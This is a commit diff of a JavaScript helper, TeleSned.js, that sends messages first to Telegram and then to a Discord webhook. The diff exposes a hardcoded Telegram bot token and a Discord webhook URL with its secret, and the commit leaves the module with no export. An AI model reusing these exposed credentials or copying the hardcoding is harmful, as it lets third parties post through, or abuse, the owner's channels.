d23a55d041fce47da701a4f9d5c51c4aa59e883d
Mhmd8998 <alnasrmhmd9988@gmail.com>
2024-12-04 14:35:55 +0300

    Update TeleSned.js

--- ‏‏my-app/src/server/TeleSned.js
+++ ‏‏my-app/src/server/TeleSned.js
@@ -1,27 +1,23 @@
 import axios from 'axios';
 
 
-export const TeleSned = () => {
-
+const TeleSned = () => {
+     
     const Send = async (des) => {
-     /*   const body = {
+        const body = {
           content: "Hacker",
           tts: false,
           color: "white",
           embeds: [
             {
-              title: "مدونة سمسا",
+              title: " مدونة سمسا ",
               description: des,
            },
           ],
-    };*/let txt= "مدونة سمسا  %0A"+ des   
-        await axios.post(`https://api.telegram.org/bot7864220710:AAHIw4gfKXRA75HzVkexkeAU2sEShcT8Sg4/sendMessage?chat_id=6492431697&text=${txt}`)
-             
+    };
+
+        await axios.post("https://discord.com/api/webhooks/1313828841202122813/IGUXWCA506nzQ9avzeUQ96wS6OKvD6r7VXXJZp3NPMOEghWJQ-htd5ohVKPy2r229jtD",body) 
     }
   return {
     Send,
 }
-}
-
-export default TeleSned;
-// 
